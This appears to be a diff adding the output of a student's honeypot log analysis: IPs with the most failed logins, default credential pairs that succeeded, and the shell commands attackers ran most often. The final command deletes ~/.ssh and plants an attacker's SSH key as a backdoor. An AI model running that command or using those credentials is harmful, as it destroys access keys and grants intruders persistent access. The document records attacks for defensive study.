@@ -1,0 +1,87 @@
+Failed login Output: 
+
+IP Addresss      Failed
+-----------------------
+197.5.145.69         28
+2.82.170.124         25
+106.13.236.133       24
+159.89.130.245       18
+167.71.234.157       17
+139.186.77.46        17
+104.42.113.137       15
+121.102.93.198       15
+122.51.81.247        14
+190.52.191.49        14
+139.59.39.185        13
+210.178.121.46       11
+146.0.209.73         11
+
+Success Login Pattern Output:
+
+Username        Password         IP_Count
+-----------------------------------------
+b'root'         b'admin'                8
+b'root'         b'password'             1
+b'oracle'       b'oracle'               1
+
+Extra credit: I chose the top commnads which list most common shell commands
+
+Most Common Shell Commands
+Command                                                                                                                                     
+                                                                                                                                            
+                                                                                                                                            
+                                                                     Count
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+cat /proc/cpuinfo | grep name | wc -l                                                                                                       
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'                                                                
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'                                                                                   
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+ls -lh $(which ls)                                                                                                                          
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+which ls                                                                                                                                    
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+crontab -l                                                                                                                                  
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+w                                                                                                                                           
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+uname -m                                                                                                                                    
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+cat /proc/cpuinfo | grep model | grep name | wc -l                                                                                          
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+top                                                                                                                                         
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+uname                                                                                                                                       
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+uname -a                                                                                                                                    
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+lscpu | grep Model                                                                                                                          
+                                                                                                                                            
+                                                                                                                                            
+                                                                         2
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~        2
